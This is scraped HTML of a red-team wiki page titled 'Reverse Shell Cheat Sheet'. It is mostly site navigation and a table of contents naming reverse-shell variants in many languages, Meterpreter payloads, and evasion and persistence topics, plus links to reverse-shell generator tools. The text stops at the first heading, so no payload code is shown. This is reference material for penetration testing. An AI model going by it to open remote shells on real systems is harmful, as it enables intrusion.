    Cobalt Strike - Kits
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Cobalt Strike
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/metasploit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Metasploit
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../command-control/mythic/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mythic C2
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Containers
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    Containers
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Docker
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../containers/kubernetes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Kubernetes
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Databases
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    Databases
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-audit-checks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MSSQL - Audit Checks
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-command-execution/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MSSQL - Command Execution
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MSSQL - Credentials
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MSSQL - Database Enumeration
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../databases/mssql-linked-database/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MSSQL - Linked Database
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Devops
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    Devops
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD Attacks
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-azure-devops/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - Azure DevOps
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-buildkite/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - BuildKite
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-circle-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - CircleCI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-drone-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - Drone CI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-github-actions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - GitHub Actions
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-gitlab-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CI/CD - Gitlab CI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/package-managers/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Package Managers and Build Files
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/secrets-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hardcoded Secrets Enumeration
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Methodology
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    Methodology
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/android-applications/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Android Application
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Bug Hunting Methodology
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/source-code-analysis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Source Code Analysis
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Vulnerability Reports
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Redteam
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            
  
    Redteam
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
        
          
          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Access
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Access
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/clickfix/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    ClickFix
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    HTML Smuggling
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/initial-access/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Initial Access
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Office - Attacks
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Phishing
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/web-attack-surface/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Web Attack Surface
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - Download and execute methods
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - Using credentials
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
        
          
          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Escalation
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Escalation
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Linux - Privilege Escalation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - Privilege Escalation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" >
        
          
          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Evasion
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Evasion
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/edr-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Endpoint Detection and Response
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/elastic-edr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Elastic EDR
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Linux - Evasion
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/opsec-fails/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    OPSEC
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/proxy-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Proxy Bypass
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - AMSI Bypass
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - Defenses
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - DPAPI
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
        
          
          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Persistence
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Persistence
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Linux - Persistence
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/rdp-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    RDP - Persistence
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Windows - Persistence
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" >
        
          
          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Pivoting
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Pivoting
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Network Pivoting Techniques
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/pivoting/network-pivoting-tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Network Pivoting Tools
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      
        Summary
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tools
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Reverse Shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reverse Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bash-udp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash UDP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#socat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Socat
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#perl" class="md-nav__link">
    <span class="md-ellipsis">
      
        Perl
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python" class="md-nav__link">
    <span class="md-ellipsis">
      
        Python
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ruby" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ruby
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rust" class="md-nav__link">
    <span class="md-ellipsis">
      
        Rust
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golang" class="md-nav__link">
    <span class="md-ellipsis">
      
        Golang
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-traditional" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat Traditional
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-openbsd" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat OpenBsd
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netcat-busybox" class="md-nav__link">
    <span class="md-ellipsis">
      
        Netcat BusyBox
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ncat" class="md-nav__link">
    <span class="md-ellipsis">
      
        Ncat
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#openssl" class="md-nav__link">
    <span class="md-ellipsis">
      
        OpenSSL
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Powershell
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#awk" class="md-nav__link">
    <span class="md-ellipsis">
      
        Awk
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#java-alternative-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java Alternative 1
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-alternative-2" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java Alternative 2
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#telnet" class="md-nav__link">
    <span class="md-ellipsis">
      
        Telnet
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#war" class="md-nav__link">
    <span class="md-ellipsis">
      
        War
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lua" class="md-nav__link">
    <span class="md-ellipsis">
      
        Lua
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nodejs" class="md-nav__link">
    <span class="md-ellipsis">
      
        NodeJS
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ognl" class="md-nav__link">
    <span class="md-ellipsis">
      
        OGNL
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#groovy" class="md-nav__link">
    <span class="md-ellipsis">
      
        Groovy
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Groovy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#groovy-alternative-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        Groovy Alternative 1
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#c" class="md-nav__link">
    <span class="md-ellipsis">
      
        C
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dart" class="md-nav__link">
    <span class="md-ellipsis">
      
        Dart
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#meterpreter-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Meterpreter Shell
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Meterpreter Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-staged-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Staged reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-stageless-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Windows Stageless reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-staged-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Staged reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-stageless-reverse-tcp" class="md-nav__link">
    <span class="md-ellipsis">
      
        Linux Stageless reverse TCP
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#other-platforms" class="md-nav__link">
    <span class="md-ellipsis">
      
        Other platforms
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#spawn-tty-shell" class="md-nav__link">
    <span class="md-ellipsis">
      
        Spawn TTY Shell
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fully-interactive-reverse-shell-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      
        Fully interactive reverse shell on Windows
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      
        References
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
	
                  


  
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/shell-reverse-cheatsheet.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/raw/main/docs/cheatsheets/shell-reverse-cheatsheet.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<h1 id="reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#tools">Tools</a></li>
<li><a href="#reverse-shell">Reverse Shell</a><ul>
<li><a href="#awk">Awk</a></li>
<li><a href="#bash-tcp">Bash TCP</a></li>
<li><a href="#bash-udp">Bash UDP</a></li>
<li><a href="#c">C</a></li>
<li><a href="#dart">Dart</a></li>
<li><a href="#golang">Golang</a></li>
<li><a href="#groovy-alternative-1">Groovy Alternative 1</a></li>
<li><a href="#groovy">Groovy</a></li>
<li><a href="#java-alternative-1">Java Alternative 1</a></li>
<li><a href="#java-alternative-2">Java Alternative 2</a></li>
<li><a href="#java">Java</a></li>
<li><a href="#lua">Lua</a></li>
<li><a href="#ncat">Ncat</a></li>
<li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
<li><a href="#netcat-busybox">Netcat BusyBox</a></li>
<li><a href="#netcat-traditional">Netcat Traditional</a></li>
<li><a href="#nodejs">NodeJS</a></li>
<li><a href="#ognl">OGNL</a></li>
<li><a href="#openssl">OpenSSL</a></li>
<li><a href="#perl">Perl</a></li>
<li><a href="#php">PHP</a></li>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#ruby">Ruby</a></li>
<li><a href="#rust">Rust</a></li>
<li><a href="#socat">Socat</a></li>
<li><a href="#telnet">Telnet</a></li>
<li><a href="#war">War</a></li>
</ul>
</li>
<li><a href="#meterpreter-shell">Meterpreter Shell</a><ul>
<li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
<li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
<li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
<li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
<li><a href="#other-platforms">Other platforms</a></li>
</ul>
</li>
<li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="tools">Tools</h2>
<ul>
<li><a href="https://www.revshells.com/">reverse-shell-generator</a> - Hosted Reverse Shell generator (<a href="https://github.com/0dayCTF/reverse-shell-generator">source</a>) <img alt="image" src="https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png" /></li>
<li><a href="https://github.com/t0thkr1s/revshellgen">revshellgen</a> -  CLI Reverse Shell generator</li>
</ul>
<h2 id="reverse-shell">Reverse Shell</h2>
<h3 id="bash-tcp">Bash TCP</h3>
